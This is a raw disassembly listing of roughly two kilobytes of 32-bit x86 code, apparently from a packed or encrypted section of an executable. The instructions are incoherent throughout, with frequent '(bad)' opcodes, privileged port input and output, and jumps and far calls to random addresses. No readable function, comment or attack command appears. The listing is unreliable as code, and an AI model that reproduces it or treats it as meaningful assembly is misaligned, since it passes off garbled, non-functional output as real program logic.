  4099e5:	xchg   edi,eax
  4099e6:	jae    0x40996c
  4099e8:	(bad)  
  4099ea:	xlat   BYTE PTR ds:[ebx]
  4099eb:	lock retf 0xb04a
  4099ef:	out    dx,eax
  4099f0:	xchg   ecx,eax
  4099f1:	pop    edx
  4099f2:	mov    dh,0x59
  4099f4:	fucomi st,st(4)
  4099f6:	test   cl,bl
  4099f8:	iret   
  4099f9:	ror    BYTE PTR [ebx],cl
  4099fb:	scas   eax,DWORD PTR es:[edi]
  4099fc:	pop    ss
  4099fd:	clc    
  4099fe:	imul   esp,DWORD PTR [ebx-0x5c1d5aea],0xffffff8b
  409a05:	cmp    DWORD PTR [ebp-0x7e675882],esp
  409a0b:	add    al,0x7e
  409a0d:	mov    dl,0xa0
  409a0f:	call   0x85603024
  409a14:	lods   al,BYTE PTR ds:[esi]
  409a15:	jl     0x409a45
  409a17:	pushf  
  409a18:	test   BYTE PTR [ebp+0x1f],bh
  409a1b:	(bad)  
  409a1c:	jne    0x409a56
  409a1e:	jl     0x409a3d
  409a20:	push   esp
  409a21:	sub    dh,bl
  409a23:	out    0xb2,eax
  409a25:	(bad)
  409a28:	mov    dl,0x5c
  409a2a:	sub    al,0x16
  409a2c:	lods   eax,DWORD PTR cs:[esi]
  409a2e:	cmp    edi,eax
  409a30:	out    0x83,al
  409a32:	loop   0x409a72
  409a34:	jmp    0x856f0ee0
  409a39:	push   ss
  409a3a:	cmp    bh,BYTE PTR [ebx+ebx*4]
  409a3d:	aam    0xe8
  409a3f:	clc    
  409a40:	mov    esp,0xb2dbf171
  409a45:	push   ebp
  409a46:	cmp    DWORD PTR [eax],edx
  409a48:	fwait
  409a49:	push   ss
  409a4a:	jle    0x409ac5
  409a4c:	cmp    ebx,eax
  409a4e:	loopne 0x409a0d
  409a50:	mov    bl,0xa2
  409a52:	js     0x409ab8
  409a54:	or     ebx,DWORD PTR [ecx-0x64]
  409a57:	mov    dl,0x60
  409a59:	jp     0x409a82
  409a5b:	pop    eax
  409a5c:	cmp    DWORD PTR [edx+0x38d50ce0],esi
  409a62:	inc    edi
  409a63:	shl    ecx,cl
  409a65:	hlt    
  409a66:	and    edi,DWORD PTR [ecx+edx*4-0x56]
  409a6a:	and    al,0x4a
  409a6c:	sar    BYTE PTR [edi],cl
  409a6e:	dec    ecx
  409a6f:	jne    0x409aec
  409a71:	shr    DWORD PTR [edx],cl
  409a73:	sub    cl,al
  409a75:	ret    
  409a76:	mov    eax,0x22256f9b
  409a7b:	mov    ds:0x92d41c8a,al
  409a80:	and    ebx,ecx
  409a82:	cmp    eax,0x52b24573
  409a87:	sar    eax,0xc5
  409a8a:	(bad)  
  409a8b:	ficomp DWORD PTR [edi+0x2ffe32ae]
  409a91:	(bad)  
  409a92:	push   0x2f3429c1
  409a97:	pop    edx
  409a98:	pop    ecx
  409a99:	and    eax,0x1875cd25
  409a9e:	xor    BYTE PTR ds:0x7c5d897c,ah
  409aa4:	movsx  eax,BYTE PTR es:[ebx-0x5b841cb8]
  409aac:	jmp    0x3edf2732
  409ab1:	je     0x460ba63c
  409ab7:	cmc    
  409ab8:	dec    ebx
  409ab9:	jns    0x409afa
  409abb:	out    0xe9,eax
  409abd:	cli    
  409abe:	cs inc ecx
  409ac0:	sbb    al,0x4c
  409ac2:	aas    
  409ac3:	jl     0x409aec
  409ac5:	xor    ebx,0x76
  409ac8:	lods   eax,DWORD PTR ds:[esi]
  409ac9:	xchg   edx,eax
  409aca:	and    ch,bl
  409acc:	jb     0x409b2b
  409ace:	pavgb  mm6,QWORD PTR [ebx+0x64d3148e]
  409ad5:	xor    bh,BYTE PTR [ebx-0x68356ec0]
  409adb:	test   al,0x45
  409add:	push   ebx
  409ade:	adc    eax,0x24d3d31
  409ae3:	push   0x8
  409ae5:	iret   
  409ae6:	inc    edi
  409ae7:	fcomi  st,st(7)
  409ae9:	pop    ss
  409aea:	jnp    0x409af9
  409aec:	fld    TBYTE PTR [ebx+esi*2+0x43eea91f]
  409af3:	fcom   QWORD PTR [ecx+0x7ac91ac8]
  409af9:	mov    ebx,0x88a793ac
  409afe:	dec    edi
  409aff:	push   0x2e
  409b01:	into   
  409b02:	or     DWORD PTR cs:[eax-0x7906da3b],esi
  409b09:	mov    ds:0x2626302a,al
  409b0e:	stos   DWORD PTR es:[edi],eax
  409b0f:	mov    ch,0xa5
  409b11:	sub    al,0x52
  409b13:	adc    BYTE PTR [esi-0x6],0x8
  409b17:	inc    ebx
  409b18:	jns    0x409b90
  409b1a:	scas   eax,DWORD PTR es:[edi]
  409b1b:	or     cl,BYTE PTR [ebp-0x1d3e1b93]
  409b21:	jp     0x409ae8
  409b23:	push   ecx
  409b24:	mov    bh,0x61
  409b26:	pop    esp
  409b27:	pop    ecx
  409b28:	call   0xf7c95ae5
  409b2d:	enter  0x9073,0xe3
  409b31:	inc    ecx
  409b32:	cmp    eax,0x325095ad
  409b37:	fcom   QWORD PTR [edx+0x6ad4dec3]
  409b3d:	sbb    eax,0x8f1c298d
  409b42:	(bad)
  409b45:	inc    esp
  409b46:	inc    ebp
  409b47:	data16 jne 0x409b7d
  409b4a:	(bad)  
  409b4c:	push   ss
  409b4d:	out    dx,eax
  409b4e:	mov    edx,0xb90cf9d7
  409b53:	mov    bl,0x20
  409b55:	xchg   esi,eax
  409b56:	push   edx
  409b57:	mov    ecx,edx
  409b59:	vpmacssww xmm12,xmm4,xmm0,XMMWORD PTR es:[ebx-0x116ca4c3]
  409b64:	dec    ebp
  409b65:	nop
  409b66:	retf   
  409b67:	test   DWORD PTR [ebx+0x629247b3],edx
  409b6d:	xchg   BYTE PTR [ebp+eax*1+0x1a15e412],ch
  409b74:	mov    WORD PTR [edi+0x474c0102],?
  409b7a:	mov    al,ds:0xa9889504
  409b7f:	outs   dx,BYTE PTR ds:[esi]
  409b80:	or     eax,0x42917b15
  409b85:	fs pop esi
  409b87:	xacquire xchg DWORD PTR [edx+0x17],edx
  409b8b:	aad    0x26
  409b8d:	pop    ds
  409b8e:	fwait
  409b8f:	jnp    0x409bed
  409b91:	arpl   WORD PTR [edi],bp
  409b93:	lods   al,BYTE PTR ds:[esi]
  409b94:	jmp    0x88e6:0xe146a8ba
  409b9b:	test   al,0x80
  409b9d:	cmp    BYTE PTR [esi],cl
  409b9f:	sub    eax,DWORD PTR [edi+0x6]
  409ba2:	xor    ebx,ecx
  409ba4:	mov    esi,0x43ffbe94
  409ba9:	ja     0x409b3c
  409bab:	aam    0x42
  409bad:	dec    edx
  409bae:	lods   al,BYTE PTR ds:[esi]
  409baf:	sar    BYTE PTR [ebx-0x24e51bfe],0xb8
  409bb6:	mov    eax,0xd40fd34e
  409bbb:	aad    0x9b
  409bbd:	enter  0xb73a,0xb3
  409bc1:	pop    ecx
  409bc2:	or     cl,bl
  409bc4:	call   0xf65fa452
  409bc9:	xor    ecx,DWORD PTR [edi]
  409bcb:	xchg   ebp,eax
  409bcc:	inc    esp
  409bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bce:	and    DWORD PTR [edi+0x4b9e922d],edx
  409bd4:	sub    al,0xea
  409bd6:	ret    0xf0aa
  409bd9:	into   
  409bda:	loopne 0x409c52
  409bdc:	mov    eax,0x59cad267
  409be1:	sbb    eax,0x7bdfbea9
  409be6:	loop   0x409bba
  409be8:	sub    BYTE PTR [edi-0x15018fb1],ah
  409bee:	add    ch,al
  409bf0:	or     DWORD PTR [edi-0x42d54dd5],edx
  409bf6:	push   0xffffff83
  409bf8:	(bad)  
  409bf9:	push   ebx
  409bfa:	mov    ds,WORD PTR [esi]
  409bfc:	(bad)  
  409bfe:	lods   al,BYTE PTR ds:[esi]
  409bff:	pusha  
  409c00:	ja     0x409c4b
  409c02:	pop    esp
  409c03:	sbb    DWORD PTR [eax+edx*4-0xa],ecx
  409c07:	test   BYTE PTR [ecx],ah
  409c09:	mov    dh,0x19
  409c0b:	inc    ecx
  409c0c:	xchg   edx,eax
  409c0d:	loope  0x409bfa
  409c0f:	add    eax,0x86b29bc4
  409c14:	mov    DWORD PTR [ebx],esi
  409c16:	sub    al,0xaa
  409c18:	mov    ds:0x58717ab1,al
  409c1d:	pop    ecx
  409c1e:	test   BYTE PTR [ecx+0x69e7e79b],al
  409c24:	adc    BYTE PTR [ebx+0x9],bl
  409c27:	(bad)  
  409c28:	in     al,dx
  409c29:	xchg   BYTE PTR [ecx-0x2f],bh
  409c2c:	call   0xe6fd:0x36895b11
  409c33:	out    dx,al
  409c34:	adc    dh,0x5c
  409c37:	add    ebx,eax
  409c39:	cmp    edi,DWORD PTR [eax+ebp*1-0x6a]
  409c3d:	dec    ebp
  409c3e:	lds    ecx,FWORD PTR [esi]
  409c40:	pop    edx
  409c41:	ins    DWORD PTR es:[edi],dx
  409c42:	loope  0x409c93
  409c44:	xchg   esi,eax
  409c45:	mov    dh,0x60
  409c47:	imul   DWORD PTR [si+0x3a]
  409c4b:	addr16 mov eax,0x5aec2b69
  409c51:	ins    DWORD PTR es:[edi],dx
  409c52:	push   esi
  409c53:	dec    edi
  409c54:	push   esi
  409c55:	in     al,dx
  409c56:	or     BYTE PTR [edi-0x45],bl
  409c59:	mov    cl,0xf9
  409c5b:	repnz mov bl,0xb
  409c5e:	pop    ecx
  409c5f:	sub    al,0xfc
  409c61:	adc    BYTE PTR [ecx-0x50],al
  409c64:	sbb    bl,BYTE PTR [ebp+0x2ba19172]
  409c6a:	and    al,0xe8
  409c6c:	dec    edi
  409c6d:	aaa    
  409c6e:	xchg   DWORD PTR [ebx],esi
  409c70:	ja     0x409c04
  409c72:	call   0xdd23:0x9bfc05a9
  409c79:	or     DWORD PTR [edx+0x58fce120],esp
  409c7f:	mov    DWORD PTR [ecx],0xe1cfb7e2
  409c85:	xor    DWORD PTR [eax],0x7644d4b4
  409c8b:	mov    DWORD PTR [edi],eax
  409c8d:	push   cs
  409c8e:	mov    bl,0x97
  409c90:	push   ds
  409c91:	mov    esp,0xc598e4f9
  409c96:	mov    cs,WORD PTR [ecx+0x38e5c597]
  409c9c:	jl     0x409ca0
  409c9e:	mov    dl,0xa7
  409ca0:	dec    ebx
  409ca1:	push   ds
  409ca2:	jnp    0x409cb0
  409ca4:	mov    eax,ds:0xe07e929f
  409ca9:	pop    esi
  409caa:	ret    0x2a03
  409cad:	or     al,0xf2
  409caf:	jnp    0x409c6f
  409cb1:	cmp    eax,0xee5758f7
  409cb6:	ror    BYTE PTR [ebx],0xf6
  409cb9:	inc    esi
  409cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cbb:	inc    edi
  409cbc:	jl     0x409c7d
  409cbe:	test   BYTE PTR ds:0xd0eeff28,0xe
  409cc5:	mov    al,ds:0x55b5900
  409cca:	addr16 push es
  409ccc:	mov    esi,0x6cd44508
  409cd1:	les    esp,FWORD PTR [edi+eax*4+0x54]
  409cd5:	cdq    
  409cd6:	cmp    al,0x33
  409cd8:	pop    ebx
  409cd9:	xchg   edx,eax
  409cda:	icebp  
  409cdb:	popf   
  409cdc:	and    ah,BYTE PTR ds:0x112c9c7
  409ce2:	and    esp,ebp
  409ce4:	fidiv  WORD PTR [ecx-0x6]
  409ce7:	jge    0x409d0e
  409ce9:	sbb    DWORD PTR [ecx-0x54],esi
  409cec:	dec    ebp
  409ced:	fst    QWORD PTR [edi-0x73]
  409cf0:	pop    ebp
  409cf1:	(bad)  
  409cf2:	pop    esp
  409cf3:	or     DWORD PTR [ecx-0x3b8398f5],esi
  409cf9:	dec    ebp
  409cfa:	jmp    0x1b99:0x4197b8c0
  409d01:	xchg   ebp,eax
  409d02:	push   esp
  409d03:	lods   eax,DWORD PTR ds:[esi]
  409d04:	pushf  
  409d05:	scas   al,BYTE PTR es:[edi]
  409d06:	ds call 0xdd6e:0x169981e
  409d0e:	cwde   
  409d0f:	arpl   WORD PTR [eax],dx
  409d11:	push   ss
  409d12:	fiadd  WORD PTR [ecx+0x20]
  409d15:	leave  
  409d16:	jno    0x409d00
  409d18:	test   eax,0x82e1ae42
  409d1d:	or     al,0x84
  409d1f:	repz jle 0x409d4b
  409d22:	fistp  DWORD PTR [edx]
  409d24:	pop    ebx
  409d25:	adc    BYTE PTR [eax+0x6b68a1d4],0x16
  409d2c:	cwde   
  409d2d:	nop
  409d2e:	dec    eax
  409d2f:	jnp    0x409ce3
  409d31:	xchg   ebp,eax
  409d32:	xchg   bh,bl
  409d34:	inc    ecx
  409d35:	ins    DWORD PTR es:[edi],dx
  409d36:	int    0x89
  409d38:	adc    al,0x1
  409d3a:	pop    esi
  409d3b:	jne    0x409d1a
  409d3d:	lahf   
  409d3e:	dec    edx
  409d3f:	js     0x409d8b
  409d41:	cld    
  409d42:	xchg   ebx,eax
  409d43:	scas   al,BYTE PTR es:[edi]
  409d44:	xor    ch,BYTE PTR [esi-0x73]
  409d47:	push   cs
  409d48:	mov    ebx,DWORD PTR [edx-0x67]
  409d4b:	rcr    BYTE PTR [edi+0x48dfb4c8],cl
  409d51:	aaa    
  409d52:	into   
  409d53:	and    eax,0xf8aa407c
  409d58:	nop
  409d59:	mov    ch,0xb9
  409d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d5c:	or     esi,DWORD PTR [ebp+0x5d282416]
  409d62:	push   cs
  409d63:	xchg   ebx,eax
  409d64:	jb     0x409d2b
  409d66:	int3   
  409d67:	cmp    esi,DWORD PTR [ebx+0x16]
  409d6a:	ret    0x116b
  409d6d:	fdivrp st(2),st
  409d6f:	mov    ecx,esp
  409d71:	mov    ebp,0xcbd260c6
  409d76:	sbb    al,0xde
  409d78:	jmp    0x409de7
  409d7a:	mov    eax,0x2900ef47
  409d7f:	adc    DWORD PTR [esi+edi*2+0x8aed07c],edx
  409d86:	pop    ecx
  409d87:	test   BYTE PTR [ecx+edx*2],dh
  409d8a:	jno    0x409d77
  409d8c:	clc    
  409d8d:	mov    BYTE PTR [ebx],dl
  409d8f:	mov    eax,ds:0xe198543e
  409d94:	lock dec esi
  409d96:	nop
  409d97:	fistp  WORD PTR [eax]
  409d99:	pop    ss
  409d9a:	cmp    DWORD PTR [ecx+0x53],esp
  409d9d:	mov    ebx,0x6469f188
  409da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da3:	imul   esp,DWORD PTR [eax+eax*4-0x2bf8ca99],0x7c59682d
  409dae:	xchg   edi,eax
  409daf:	mov    bh,dl
  409db1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409db2:	cmc    
  409db3:	jmp    0xfe3e4b61
  409db8:	xor    BYTE PTR [ebx+0x10],al
  409dbb:	jns    0x409ddc
  409dbd:	pop    ebx
  409dbe:	inc    esi
  409dbf:	mov    bh,BYTE PTR [ebp+0x23]
  409dc2:	in     eax,0x88
  409dc4:	pop    edx
  409dc5:	int    0x38
  409dc7:	repnz sti 
  409dc9:	sbb    al,0x4b
  409dcb:	add    al,BYTE PTR [eax+0x2c2b5145]
  409dd1:	repnz sub al,0xb9
  409dd4:	pop    ebx
  409dd5:	loope  0x409e09
  409dd7:	pop    ebp
  409dd8:	sub    bl,dh
  409dda:	stos   BYTE PTR es:[edi],al
  409ddb:	aad    0xb
  409ddd:	cmp    al,0x15
  409ddf:	leave  
  409de0:	in     eax,dx
  409de1:	test   BYTE PTR [ecx+0x78],ah
  409de4:	out    dx,al
  409de5:	add    al,0x25
  409de7:	call   0x931c8d2b
  409dec:	mov    dh,0x12
  409dee:	cmp    ebp,DWORD PTR [esi+ebp*4]
  409df1:	sbb    eax,0xc0ba7798
  409df6:	mov    bl,0x94
  409df8:	cmp    eax,0xe79fc7d3
  409dfd:	mov    al,0x94
  409dff:	ret    
  409e00:	and    ecx,DWORD PTR ds:0xf3483f9f
  409e06:	enter  0x6c49,0x63
  409e0a:	lahf   
  409e0b:	dec    esp
  409e0c:	fwait
  409e0d:	lods   eax,DWORD PTR ds:[esi]
  409e0e:	call   0x16163628
  409e13:	call   0xd262d6db
  409e18:	jle    0x409df1
  409e1a:	popf   
  409e1b:	retf   0x4d5e
  409e1e:	(bad)  
  409e1f:	fdivr  QWORD PTR [eax-0x10796ee6]
  409e25:	xor    ecx,DWORD PTR [edi+0x1d61a8f2]
  409e2b:	mov    eax,ds:0xd814269d
  409e30:	xlat   BYTE PTR ds:[ebx]
  409e31:	push   edx
  409e32:	stos   DWORD PTR es:[edi],eax
  409e33:	fisub  DWORD PTR [esp+ebp*8-0x6086e07e]
  409e3a:	dec    ebx
  409e3b:	hlt    
  409e3c:	jns    0x409e8c
  409e3e:	andnps xmm3,XMMWORD PTR [edi+eiz*8-0x15]
  409e43:	or     DWORD PTR [ecx-0x4fd23ebd],edi
  409e49:	add    eax,0x2d71655e
  409e4e:	fisttp DWORD PTR [ebx+esi*4]
  409e51:	cli    
  409e52:	call   0xd6b5:0x50058fc5
  409e59:	pop    esp
  409e5a:	das    
  409e5b:	cli    
  409e5c:	cli    
  409e5d:	and    bh,dh
  409e5f:	xchg   esi,eax
  409e60:	(bad)  
  409e61:	in     al,dx
  409e62:	push   ds
  409e63:	sbb    DWORD PTR ds:0x1b856ba6,ecx
  409e69:	dec    esp
  409e6a:	int    0xc5
  409e6c:	sub    DWORD PTR [edi],ecx
  409e6e:	lds    esi,FWORD PTR [edi+0x2d13e965]
  409e74:	sub    eax,0xab756685
  409e79:	cmpps  xmm0,XMMWORD PTR [ebp+0x5d],0x4c
  409e7e:	cmp    esi,DWORD PTR cs:[ecx-0x26]
  409e82:	or     DWORD PTR [esi+ebx*1],ebx
  409e85:	jae    0x409efc
  409e87:	sbb    al,0xa6
  409e89:	inc    esi
  409e8a:	push   esi
  409e8b:	cld    
  409e8c:	pop    edx
  409e8d:	(bad)  
  409e8e:	sti    
  409e8f:	das    
  409e90:	bound  ebx,QWORD PTR [edi+0x5ddcf1e5]
  409e96:	add    ebx,DWORD PTR ds:0x8703412f
  409e9c:	or     al,0x68
  409e9e:	rcl    BYTE PTR [eax],1
  409ea0:	mov    edx,0x30ddd402
  409ea5:	int    0x56
  409ea7:	fs daa 
  409ea9:	mov    eax,ds:0x1658099a
  409eae:	push   ebp
  409eaf:	sub    al,0x28
  409eb1:	cmp    al,0x97
  409eb3:	dec    esp
  409eb4:	ret    0xa8b2
  409eb7:	aam    0x60
  409eb9:	mov    bl,0x9c
  409ebb:	cmp    al,0xa0
  409ebd:	fcomp  QWORD PTR [eax-0x10725bf1]
  409ec3:	loopne 0x409eb5
  409ec5:	cmp    edx,DWORD PTR [ecx+0x5e]
  409ec8:	dec    edi
  409ec9:	jbe    0x409ea7
  409ecb:	adc    BYTE PTR [ecx+ecx*8],ch
  409ece:	cmp    edx,DWORD PTR [esp+edi*8-0x7d0cb373]
  409ed5:	repz cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  409ed8:	sahf   
  409ed9:	jns    0x409ea7
  409edb:	cld    
  409edc:	or     dl,BYTE PTR [esi]
  409ede:	jmp    0x7a3a6dc4
  409ee3:	jns    0x409f11
  409ee5:	jge    0x409f1a
  409ee7:	(bad)  
  409ee9:	jmp    0x5448:0x1ad92cde
  409ef0:	and    DWORD PTR ds:0xc0c41099,0x55
  409ef7:	mov    esp,0x553089f7
  409efc:	mov    ch,0xce
  409efe:	jmp    0x837f335a
  409f03:	test   ch,0xe8
  409f06:	js     0x409ebb
  409f08:	ret    
  409f09:	test   eax,0x95069919
  409f0e:	jge    0x409f66
  409f10:	pusha  
  409f11:	xchg   ebx,eax
  409f12:	sub    DWORD PTR [edx],ecx
  409f14:	(bad)  
  409f15:	stc    
  409f16:	cmp    al,0xf4
  409f18:	inc    edi
  409f19:	jle    0x409ec0
  409f1b:	hlt    
  409f1c:	leave  
  409f1d:	out    dx,al
  409f1e:	ror    ecx,cl
  409f20:	jno    0x409eee
  409f22:	or     DWORD PTR [ebp-0x6c],ecx
  409f25:	int    0x6e
  409f27:	mov    ebx,0xc0596009
  409f2c:	dec    esi
  409f2d:	mov    ds:0x8ab9a24d,eax
  409f32:	push   es
  409f33:	mov    ecx,0x4ff8ea27
  409f38:	jmp    0xd01b174b
  409f3d:	repz in eax,0x5d
  409f40:	sbb    al,0x4c
  409f42:	pop    eax
  409f43:	mov    WORD PTR [ebp-0x7050b529],cs
  409f49:	in     al,0x20
  409f4b:	arpl   WORD PTR [eax-0x6386d9ff],di
  409f51:	popa   
  409f52:	ds ror dl,0xc7
  409f56:	stc    
  409f57:	jne    0x409f9c
  409f59:	cdq    
  409f5a:	inc    eax
  409f5b:	xchg   edi,eax
  409f5c:	sar    BYTE PTR [esi-0x4ac34d51],1
  409f62:	enter  0x56c4,0x5e
  409f66:	stc    
  409f67:	xlat   BYTE PTR ds:[ebx]
  409f68:	fcom   DWORD PTR [edx-0x1c]
  409f6b:	bound  edi,QWORD PTR [edx+0x0]
  409f6e:	push   ebx
  409f6f:	push   ebx
  409f70:	cmc    
  409f71:	mov    ebp,esi
  409f73:	enter  0xddc2,0x93
  409f77:	mov    bh,0x69
  409f79:	xor    ch,BYTE PTR [eax+0x7f]
  409f7c:	clc    
  409f7d:	cmp    ah,BYTE PTR [eax]
  409f7f:	pusha  
  409f80:	add    eax,0xfe92cbd7
  409f85:	sub    al,0xc5
  409f87:	or     al,0x7f
  409f89:	adc    BYTE PTR [eax],bh
  409f8b:	sbb    DWORD PTR [ebx-0x53],0xffffff9b
  409f8f:	push   esi
  409f90:	cld    
  409f91:	dec    edx
  409f92:	jno    0x40a00a
  409f94:	xchg   DWORD PTR [ebp+0x37e0a7b9],esi
  409f9a:	or     BYTE PTR [edx+0x754ca41f],0xa7
  409fa1:	cli    
  409fa2:	loop   0x409f2a
  409fa4:	dec    ecx
  409fa5:	mov    esi,0x5981d28c
  409faa:	sub    eax,0x5758b346
  409faf:	mov    bl,0x65
  409fb1:	ins    BYTE PTR es:[edi],dx
  409fb2:	or     eax,0x2018ca13
  409fb7:	aam    0xd9
  409fb9:	jg     0x409f47
  409fbb:	gs in  al,dx
  409fbd:	adc    ch,BYTE PTR [ebp-0x4bf45108]
  409fc3:	jecxz  0x40a007
  409fc5:	loope  0x409f94
  409fc7:	das    
  409fc8:	mov    WORD PTR [edi],?
  409fca:	sub    esp,DWORD PTR [ecx-0x1f]
  409fcd:	rcl    bl,1
  409fcf:	test   DWORD PTR [ecx],0x610924be
  409fd5:	adc    al,BYTE PTR [edi-0x70]
  409fd8:	shr    DWORD PTR [edx+0x55],1
  409fdb:	imul   esi,DWORD PTR [edi],0xc93ce5f7
  409fe1:	pop    ss
  409fe2:	jmp    0x50887fb0
  409fe7:	jo     0x409fd3
  409fe9:	pop    ebx
  409fea:	sahf   
  409feb:	ficom  DWORD PTR [ebp+0x32]
  409fee:	push   esi
  409fef:	and    edx,DWORD PTR [ebp+ebp*8+0x519a09b9]
  409ff6:	fist   DWORD PTR [eax]
  409ff8:	pop    ds
  409ff9:	sbb    al,0xb0
  409ffb:	pop    edi
  409ffc:	jno    0x409fc6
  409ffe:	push   ecx
  409fff:	je     0x40a058
  40a001:	mov    DWORD PTR [esi],edx
  40a003:	es jecxz 0x409fc6
  40a006:	test   BYTE PTR [edx+0x72],dl
  40a009:	push   es
  40a00a:	add    BYTE PTR [edx-0x74],bh
  40a00d:	fnstsw WORD PTR [ebx]
  40a00f:	or     DWORD PTR [esi+0x68],ecx
  40a012:	or     eax,0x3699457e
  40a017:	xor    al,0x8b
  40a019:	repz or eax,0x89f4c8ea
  40a01f:	inc    eax
  40a020:	ret    0x2625
  40a023:	scas   eax,DWORD PTR es:[edi]
  40a024:	popf   
  40a025:	test   DWORD PTR [eax-0x46],edx
  40a028:	aam    0x1f
  40a02a:	pop    edi
  40a02b:	pop    ebx
  40a02c:	in     eax,dx
  40a02d:	and    ebx,edx
  40a02f:	jno    0x409fb5
  40a031:	lods   eax,DWORD PTR ds:[esi]
  40a032:	or     DWORD PTR [ebp-0x3116fb58],esi
  40a038:	mov    bl,0xe8
  40a03a:	adc    BYTE PTR [edx-0x7f],dh
  40a03d:	mov    DWORD PTR [ecx-0x7b0642ba],ebp
  40a043:	int3   
  40a044:	and    ch,BYTE PTR [ecx-0x16f46581]
  40a04a:	jle    0x40a029
  40a04c:	or     bl,dh
  40a04e:	cmp    ah,ah
  40a050:	cwde   
  40a051:	push   0x382ba965
  40a056:	mov    DWORD PTR [ebx+0x5c],esi
  40a059:	addr16 sub eax,0x9b74e2f2
  40a05f:	test   DWORD PTR [ebx-0x3a],0x3fd11292
  40a066:	bound  esp,QWORD PTR [ebx*8+0x7575f3a0]
  40a06d:	(bad)  
  40a06e:	fld    DWORD PTR [edi+0x17]
  40a071:	sub    al,BYTE PTR [ebx+0x6b47ca4]
  40a077:	sbb    DWORD PTR ds:[edi-0x67],esp
  40a07b:	xchg   ecx,eax
  40a07c:	aam    0x19
  40a07e:	gs jle 0x40a06e
  40a081:	or     al,0xd1
  40a083:	sbb    bh,0xbd
  40a086:	xchg   ebp,eax
  40a087:	pop    es
  40a088:	lahf   
  40a089:	jo     0x40a0d0
  40a08b:	rol    BYTE PTR [eax+0x404ae080],0x12
  40a092:	loop   0x40a053
  40a094:	jle    0x40a01d
  40a096:	push   ss
  40a097:	lods   al,BYTE PTR ds:[esi]
  40a098:	popa   
  40a099:	mov    esi,0x3e29e480
  40a09e:	pop    ecx
  40a09f:	js     0x40a0df
  40a0a1:	sti    
  40a0a2:	and    eax,edi
  40a0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0a5:	cld    
  40a0a6:	xchg   ebx,eax
  40a0a7:	outs   dx,DWORD PTR ds:[esi]
  40a0a8:	xchg   ebp,eax
  40a0a9:	neg    BYTE PTR [edx-0x34d295fd]
  40a0af:	(bad)  
  40a0b0:	fdivr  DWORD PTR [esi]
  40a0b2:	ret    
  40a0b3:	add    al,0xcc
  40a0b5:	pop    es
  40a0b6:	jae    0x40a103
  40a0b8:	push   ebx
  40a0b9:	dec    eax
  40a0ba:	pop    esp
  40a0bb:	push   cs
  40a0bc:	adc    eax,0xe169d313
  40a0c1:	ins    DWORD PTR es:[edi],dx
  40a0c2:	out    dx,eax
  40a0c3:	test   ebp,0x35da6f93
  40a0c9:	stos   BYTE PTR es:[edi],al
  40a0ca:	arpl   WORD PTR ds:0xe423f1cf,di
  40a0d0:	sbb    al,0x72
  40a0d2:	jge    0x40a0b2
  40a0d4:	dec    ebp
  40a0d5:	mov    edi,0x18a2cb9b
  40a0da:	cmp    al,0xca
  40a0dc:	gs dec esp
  40a0de:	xchg   ecx,eax
  40a0df:	mov    BYTE PTR [esi+0x5c],bh
  40a0e2:	inc    eax
  40a0e3:	sub    ebp,DWORD PTR [esi]
  40a0e5:	lds    edi,FWORD PTR [eax]
  40a0e7:	jl     0x40a121
  40a0e9:	sub    eax,0x7623611b
  40a0ee:	cdq    
  40a0ef:	(bad)  
  40a0f1:	ds xchg ebp,eax
  40a0f3:	ret    0x60c1
  40a0f6:	iret   
  40a0f7:	(bad)  
  40a0f8:	add    bl,BYTE PTR [ebx-0x15]
  40a0fb:	ror    BYTE PTR [edx-0x52],cl
  40a0fe:	pop    ecx
  40a0ff:	cs lock xor al,0xb1
  40a103:	sbb    al,0x59
  40a105:	enter  0x4c30,0x3a
  40a109:	div    BYTE PTR [esi-0x3de2bfa3]
  40a10f:	dec    edi
  40a110:	inc    edi
  40a111:	push   edi
  40a112:	pop    esi
  40a113:	(bad)  
  40a114:	(bad)  
  40a115:	fisttp WORD PTR [ebp-0xe0f55fe]
  40a11b:	xor    BYTE PTR [edi-0x15],0x28
  40a11f:	push   eax
  40a120:	cmp    eax,0xad6e1763
  40a125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a126:	cdq    
  40a127:	or     ecx,DWORD PTR [esi-0x6bdf4ae9]
  40a12d:	and    al,BYTE PTR [ebp+eiz*2+0x2a1f39c5]
  40a134:	out    0x14,eax
  40a136:	pop    es
  40a137:	sbb    DWORD PTR [ecx-0x2a5b76d5],edx
  40a13d:	les    esp,FWORD PTR [eax]
  40a13f:	lods   al,BYTE PTR ds:[esi]
  40a140:	adc    al,0x4
  40a142:	(bad)  
  40a143:	sbb    al,dh
  40a145:	loopne 0x40a0da
  40a147:	mov    ecx,edx
  40a149:	ret    0x8869
  40a14c:	in     al,dx
  40a14d:	xor    cl,BYTE PTR [ecx+ebx*1]
  40a150:	popf   
  40a151:	jnp    0x40a166
  40a153:	lods   eax,DWORD PTR ds:[esi]
  40a154:	sahf   
  40a155:	popf   
  40a156:	pusha  
  40a157:	out    0x9d,al
  40a159:	inc    ebp
  40a15a:	into   
  40a15b:	cli    
  40a15c:	fidivr DWORD PTR [ecx]
  40a15e:	pop    ss
  40a15f:	xor    al,0x64
  40a161:	enter  0xba09,0x35
  40a165:	retf   0x6fb0
  40a168:	or     BYTE PTR [esi],al
  40a16a:	xchg   edi,eax
  40a16b:	aaa    
  40a16c:	mov    dl,0xc7
  40a16e:	(bad)  
  40a16f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a170:	sar    DWORD PTR [esi+0x46],cl
  40a173:	jnp    0x40a176
  40a175:	xchg   ebp,eax
  40a176:	imul   eax,DWORD PTR [edi-0x5f],0x31
  40a17a:	sub    BYTE PTR [ecx-0x1a],dh
  40a17d:	sbb    al,BYTE PTR [ebx+0x67b665b8]
  40a183:	mov    edi,0x387789a2
  40a188:	sub    DWORD PTR [ebx-0x35],esi
  40a18b:	mov    fs,WORD PTR [ebx+0x77]
  40a18e:	ret    0xb647
  40a191:	arpl   WORD PTR [esi-0x2d],ax
  40a194:	gs fcom st(3)
  40a197:	ror    ebx,0xef
  40a19a:	dec    eax
  40a19b:	out    dx,al
  40a19c:	rol    DWORD PTR [esi],1
